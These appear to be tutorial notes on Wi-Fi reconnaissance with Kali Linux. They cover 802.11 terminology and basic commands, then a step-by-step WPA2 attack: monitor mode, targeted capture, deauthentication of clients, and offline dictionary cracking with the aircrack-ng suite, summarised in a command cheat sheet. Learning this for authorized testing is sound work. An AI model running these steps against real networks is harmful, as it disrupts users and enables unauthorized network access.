1. Introduction & Context
--------------------------------------------------------------------------------------------------------------------------------------
* Core Significance:
    -> The ability to scan, analyze, and connect to any network device is a fundamental skill for penetration testers and hackers.
    -> Wi-Fi (IEEE 802.11) and Bluetooth serve as the standard media for modern wireless communications; mastering them is critical
       for recon.

* Security & Threat Risks:
    -> Gaining unauthorized access to a wireless Access Point (AP) grants entry into the internal network, exposing all connected
       hosts.
    -> Attackers can perform packet sniffing, credential harvesting, and man-in-the-middle (MitM) attacks once on the network.

* Operating System Integration:
    -> Kali Linux comes equipped with native network stacks, specialized drivers, and the complete `aircrack-ng` suite.


2. Fundamental Wi-Fi Terminology & Technologies
--------------------------------------------------------------------------------------------------------------------------------------
* Network Identifiers:
    - AP (Access Point)               : Central networking device providing wireless connectivity to client devices.
    - SSID (Service Set Identifier)   : Human-readable name of a single wireless network.
    - ESSID (Extended Service Set ID) : Collective network name used across multiple APs spanning a wider LAN.
    - BSSID (Basic Service Set ID)    : Unique hardware MAC address identifying a specific Access Point interface.

* Physical Layer Specifications:
    -> Channels                        : Operates on 14 channels globally (1–14); legally restricted to channels 1–11 in the United
                                        States.
    -> Signal Power (PWR)              : Proximity to an AP yields higher signal-to-noise ratios, leading to lower packet corruption
                                        during captures.
    -> Operational Range               : US regulatory power limit is 0.5 Watts (~300 feet / 100 meters); extended up to 20 miles with
                                        directional high-gain antennas.
    -> Frequency Bands                 : Primary operational frequencies are 2.4 GHz (longer range) and 5 GHz (higher throughput).

* Security Protocols:
    -> WEP (Wired Equivalent Privacy)  : Deprecated and legacy protocol; vulnerable to statistical key recovery (cracked in minutes).
    -> WPA (Wi-Fi Protected Access)    : Transitional standard created to address WEP vulnerabilities using TKIP.
    -> WPA2-PSK (Pre-Shared Key)       : Standard modern protocol relying on CCMP/AES encryption and a 4-Way Handshake authentication
                                         flow.

* Wireless Operational Modes:
    -> Managed Mode : Default client behavior (associates and communicates directly with an Access Point).
    -> Master Mode  : Converts the wireless network adapter to function as an Access Point itself.
    -> Monitor Mode : Places the card in promiscuous RF mode to sniff and capture raw 802.11 frames from all surrounding networks.


3. Basic Linux Wireless Commands
--------------------------------------------------------------------------------------------------------------------------------------
* Interface Inspection (`ifconfig`):
    -> Function : Lists activated network interfaces and assigned IP configurations.
    -> Naming   : Linux designates wireless interfaces sequentially as `wlan0`, `wlan1`, etc.

* Wireless Configuration (`iwconfig`):
    -> Usage    : `iwconfig`
    -> Function : Displays operational parameters specific to wireless adapters.
    -> Key Metrics Shown:
        * Wireless Standard (e.g., IEEE 802.11bg)
        * Operational Mode (e.g., Mode:Managed)
        * ESSID Status (e.g., ESSID:off/any or active network name)
        * AP Hardware Address (BSSID)
        * Transmit Power (Tx-Power)
        * Link Quality & Signal Level (in dBm)

* AP Scanning (`iwlist`):
    -> Syntax   : `iwlist <interface> action`
    -> Command  : `iwlist wlan0 scan`
    -> Function : Returns detailed wireless survey data including Cell Number, BSSID, Channel, Frequency, Signal Level, Encryption,
                  and ESSID.

* Connection Management (`nmcli`):
    -> Network Survey Command:
        nmcli dev wifi
    -> Survey Columns : SSID, MODE, CHAN, RATE, SIGNAL, BARS, SECURITY.
    -> AP Association Syntax:
        nmcli dev wifi connect <AP-SSID> password <AP-password>
    -> Practical Example:
        nmcli dev wifi connect Hackers-Arise password 12345678


4. Wi-Fi Reconnaissance & Cracking Workflow (`aircrack-ng` Suite)
--------------------------------------------------------------------------------------------------------------------------------------
* Core Reconnaissance Requirements:
    1. Target AP's MAC Address (BSSID)
    2. Target AP's Operating Channel Number
    3. Connected Client's MAC Address (Station)
    4. A Dictionary File (Wordlist)

* Step 1: Enable Monitor Mode (`airmon-ng`)
    -> Purpose : Transitions interface from `Managed` to `Monitor` mode to capture raw frames.
    -> Command : `airmon-ng start wlan0`
    -> Result  : Renames interface to `wlan0mon`.
    -> Maintenance : Execute `airmon-ng check kill` if background daemons interfere.

* Step 2: Ambient Survey (`airodump-ng`)
    -> Command : `airodump-ng wlan0mon`
    -> Output Data Breakdown:
        * Top Section (Access Points):
            - BSSID  : Target AP MAC address
            - PWR    : Signal strength (higher/closer to 0 is better)
            - CH     : Channel number (1–14)
            - ENC    : Encryption protocol (WEP / WPA / WPA2)
            - ESSID  : Broadcast network name
        * Bottom Section (Associated Clients):
            - BSSID   : Access Point MAC address the client is associated with
            - Station : Unique client MAC address

* Step 3: Targeted 3-Terminal Attack Workflow (Capturing 4-Way Handshake)

    🟢 Terminal 1: Focused Packet Capture
        -> Command :
            airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
        -> Parameters:
            * `-c 10`    : Locks channel to Channel 10.
            * `--bssid`  : Filters solely for target Access Point MAC.
            * `-w`       : Writes packet capture to disk (`Hackers-ArisePSK-01.cap`).

    🟡 Terminal 2: Client Deauthentication Attack
        -> Command :
            aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
        -> Parameters:
            * `--deauth 100` : Transmits 100 deauthentication frames.
            * `-a`           : Targets Access Point BSSID.
            * `-c`           : Targets specific client MAC address.
        -> Result : Forces client off network; upon auto-reconnection, the WPA 4-Way Handshake is broadcasted and saved in Terminal 1.

    🔴 Terminal 3: Offline Cryptographic Cracking
        -> Command :
            aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap
        -> Parameters:
            * `-w` : Path to dictionary list.
            * `-b` : BSSID filter.
            * `.cap` file : Handshake file captured from Terminal 1.


5. Summary Checklist / Command Cheat Sheet
--------------------------------------------------------------------------------------------------------------------------------------
* List Network Interfaces   : ifconfig
* Wireless Interface Info   : iwconfig
* Scan Wireless APs         : iwlist wlan0 scan
* Scan via NetworkManager   : nmcli dev wifi
* Connect to Wireless AP    : nmcli dev wifi connect <SSID> password <password>
* Enable Monitor Mode       : airmon-ng start wlan0
* Kill Conflicting Services : airmon-ng check kill
* General Traffic Survey    : airodump-ng wlan0mon
* Focused Packet Capture    : airodump-ng -c <channel> --bssid <AP_MAC> -w <filename> wlan0mon
* Transmit Deauth Packets   : aireplay-ng --deauth <count> -a <AP_MAC> -c <Client_MAC> wlan0mon
* Offline Wordlist Crack    : aircrack-ng -w <wordlist> -b <AP_MAC> <capture_file.cap>
